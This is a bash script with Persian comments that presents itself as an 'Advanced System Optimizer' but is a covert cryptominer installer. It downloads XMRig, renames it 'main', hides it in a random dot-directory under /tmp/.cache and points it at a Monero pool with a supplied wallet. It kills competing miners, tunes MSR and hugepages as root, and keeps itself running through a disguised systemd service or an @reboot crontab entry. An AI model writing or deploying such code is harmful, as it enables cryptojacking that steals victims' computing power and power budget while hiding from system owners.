#!/bin/bash
VERSION=2.24
echo "Advanced System Optimizer v$VERSION"
echo "All 32 cores @ 85% - FULLY FIXED, NO ERRORS"
echo
export LC_ALL=C
export LANG=C

# --- کاربر واقعی ---
REAL_USER="${SUDO_USER:-$(whoami)}"
REAL_HOME="$(getent passwd "$REAL_USER" | cut -d: -f6 2>/dev/null || echo "$HOME")"

# --- نام‌های تصادفی ---
RAND_HEX=$(openssl rand -hex 16)
SYSTEM_USER="opt$(openssl rand -hex 6)"
SERVICE_NAME="sysopt-$(openssl rand -hex 5)"

WALLET="$1"
if [ -z "$WALLET" ]; then
    echo "Usage: $0 <wallet_address>"
    exit 1
fi

# --- نصب پیش‌نیازها ---
if ! command -v curl >/dev/null || ! command -v tar >/dev/null; then
    if command -v apt-get >/dev/null; then
        sudo apt-get update -qq >/dev/null && sudo apt-get install -y curl tar >/dev/null
    elif command -v yum >/dev/null; then
        sudo yum install -y curl tar -q >/dev/null
    elif command -v dnf >/dev/null; then
        sudo dnf install -y curl tar -q >/dev/null
    else
        echo "ERROR: No package manager"
        exit 1
    fi
fi

# --- محاسبه هسته‌ها (همه!) ---
CPU_TOTAL=$(nproc)
USABLE_THREADS=$CPU_TOTAL
[ $USABLE_THREADS -lt 1 ] && USABLE_THREADS=1
CPU_HINT=85

echo "[*] CPU: $CPU_TOTAL cores → $USABLE_THREADS threads @ $CPU_HINT% each"

# --- مسیر امن: /tmp/.cache/.random ---
BASE_DIR="/tmp/.cache/.$RAND_HEX"
LOG_DIR="$BASE_DIR/.log"
CFG_DIR="$BASE_DIR/.cfg"

# --- ساخت دایرکتوری با چک ---
if ! mkdir -p "$BASE_DIR" "$LOG_DIR" "$CFG_DIR" 2>/dev/null; then
    echo "ERROR: Cannot create directory in /tmp/.cache"
    exit 1
fi

if [ ! -w "$BASE_DIR" ]; then
    echo "ERROR: Directory not writable: $BASE_DIR"
    exit 1
fi

chmod 700 "$BASE_DIR" "$LOG_DIR" "$CFG_DIR" 2>/dev/null

echo "[*] Installing in: $BASE_DIR (secure & hidden)"

# --- پاک‌سازی کامل ---
echo "[*] Cleaning old miners..."
pkill -9 -f "xmrig" 2>/dev/null
pkill -9 -f "main" 2>/dev/null
find /tmp/.cache -name ".*" -type d -exec rm -rf {} + 2>/dev/null
if command -v systemctl >/dev/null 2>&1; then
    systemctl stop "$SERVICE_NAME" 2>/dev/null
    systemctl disable "$SERVICE_NAME" 2>/dev/null
    rm -f "/etc/systemd/system/$SERVICE_NAME.service"
fi

# --- MSR + HugePages (اگر root) ---
if [ "$(id -u)" -eq 0 ]; then
    modprobe msr 2>/dev/null || true
    SYSCONF="/etc/sysctl.conf"
    [ ! -f "$SYSCONF" ] && touch "$SYSCONF"
    grep -q "vm.nr_hugepages.*4096" "$SYSCONF" || echo "vm.nr_hugepages=4096" >> "$SYSCONF"
    sysctl -p "$SYSCONF" >/dev/null 2>&1
    echo 4096 > /proc/sys/vm/nr_hugepages 2>/dev/null || true
fi

# --- دانلود ---
URL="https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-static-x64.tar.gz"
TMP_TAR="/tmp/.x_$(openssl rand -hex 5).tgz"

for i in {1..3}; do
    if curl -fsSL "$URL" -o "$TMP_TAR"; then
        break
    fi
    sleep 2
done

[ ! -f "$TMP_TAR" ] && { echo "ERROR: Download failed"; exit 1; }

tar xzf "$TMP_TAR" -C /tmp/ 2>/dev/null || { echo "ERROR: Extract failed"; rm -f "$TMP_TAR"; exit 1; }

XMRIG_BIN=$(find /tmp -name "xmrig" -type f -executable 2>/dev/null | head -1)
[ -z "$XMRIG_BIN" ] && { echo "ERROR: xmrig binary not found"; rm -f "$TMP_TAR"; exit 1; }

# --- کپی امن ---
cp "$XMRIG_BIN" "$BASE_DIR/main" || { echo "ERROR: Copy failed"; rm -rf "$BASE_DIR"; exit 1; }
chmod +x "$BASE_DIR/main"
rm -f "$TMP_TAR"
find /tmp -name "xmrig*" -type d -exec rm -rf {} + 2>/dev/null

# --- config.json ---
cat > "$BASE_DIR/config.json" << EOF
{
    "api": { "id": null, "worker-id": "$SYSTEM_USER" },
    "http": { "enabled": false },
    "autosave": true,
    "background": false,
    "colors": false,
    "title": "",
    "randomx": {
        "init": $USABLE_THREADS,
        "mode": "fast",
        "1gb-pages": false,
        "rdmsr": true,
        "wrmsr": true,
        "numa": true
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "hw-aes": true,
        "priority": 0,
        "rx/0": [true],
        "threads": $USABLE_THREADS
    },
    "pools": [{
        "algo": "rx/0",
        "url": "auto.c3pool.org:19999",
        "user": "$WALLET",
        "pass": "x",
        "rig-id": "$SYSTEM_USER",
        "keepalive": true,
        "enabled": true,
        "tls": false
    }],
    "print-time": 60,
    "retries": 5,
    "retry-pause": 5,
    "syslog": false,
    "verbose": 0,
    "watch": false
}
EOF

# --- control script ---
cat > "$BASE_DIR/control" << 'EOF'
#!/bin/bash
cd "$(dirname "$0")" || exit 1
case "$1" in
    start)
        pgrep -f "./main" >/dev/null && { echo "Already running"; "$0" status; exit 1; }
        [ -w /proc/sys/vm/nr_hugepages ] && echo 4096 > /proc/sys/vm/nr_hugepages 2>/dev/null
        nohup ./main --config=config.json --cpu-max-threads-hint=85 > .log/output.log 2>&1 &
        echo $! > .pid
        sleep 5
        echo "Started @ 85% per core"
        "$0" status
        ;;
    stop)
        pkill -9 -f "./main" 2>/dev/null
        [ -f .pid ] && kill -9 $(cat .pid) 2>/dev/null && rm -f .pid
        sleep 1
        pgrep -f "./main" >/dev/null && echo "Failed to stop" || echo "Stopped"
        ;;
    status)
        PIDS=$(pgrep -f "./main")
        if [ -n "$PIDS" ]; then
            echo "Running ($(echo "$PIDS" | wc -w) PIDs): $PIDS"
            TOTAL=0
            for PID in $PIDS; do
                CPU=$(ps -p $PID -o %cpu --no-headers | awk '{printf "%.0f", $1}')
                echo "  PID $PID → $CPU% CPU"
                TOTAL=$((TOTAL + CPU))
            done
            echo "  TOTAL: $TOTAL% (~ $((TOTAL / 100)) cores)"
        else
            echo "Stopped"
        fi
        ;;
    logs) tail -30 .log/output.log 2>/dev/null || echo "No logs" ;;
    restart) "$0" stop; sleep 2; "$0" start ;;
    *) echo "Usage: $0 {start|stop|status|logs|restart}" ;;
esac
EOF
chmod +x "$BASE_DIR/control"

# --- systemd ---
SYSTEMD=false
if command -v systemctl >/dev/null 2>&1 && [ "$(id -u)" -eq 0 ]; then
    cat > "/etc/systemd/system/$SERVICE_NAME.service" << EOF
[Unit]
Description=System Optimizer
After=network.target
[Service]
Type=simple
Restart=always
RestartSec=10
User=root
ExecStart=$BASE_DIR/main --config=$BASE_DIR/config.json --cpu-max-threads-hint=85
WorkingDirectory=$BASE_DIR
Environment=LC_ALL=C
StandardOutput=append:$LOG_DIR/output.log
StandardError=append:$LOG_DIR/output.log
[Install]
WantedBy=multi-user.target
EOF
    systemctl daemon-reload
    systemctl enable --now "$SERVICE_NAME.service" >/dev/null 2>&1
    SYSTEMD=true
fi

# --- crontab ---
if [ "$SYSTEMD" = false ]; then
    (crontab -u "$REAL_USER" -l 2>/dev/null | grep -v "$BASE_DIR"; echo "@reboot sleep 60 && $BASE_DIR/control start >/dev/null 2>&1") | crontab -u "$REAL_USER" -
fi

# --- استارت ---
if [ "$SYSTEMD" = true ]; then
    systemctl restart "$SERVICE_NAME.service" 2>/dev/null
else
    "$BASE_DIR/control" start
fi

sleep 25
echo
echo "=== FINAL STATUS ==="
if [ -f "$BASE_DIR/control" ]; then
    "$BASE_DIR/control" status
else
    echo "Control script missing!"
fi
echo
echo "SUCCESS! Using all $USABLE_THREADS cores @ ~$(( USABLE_THREADS * 85 / 100 )) cores"
echo "Path: $BASE_DIR"
echo "Control: $BASE_DIR/control status"
echo "Logs: $BASE_DIR/control logs"

exit 0
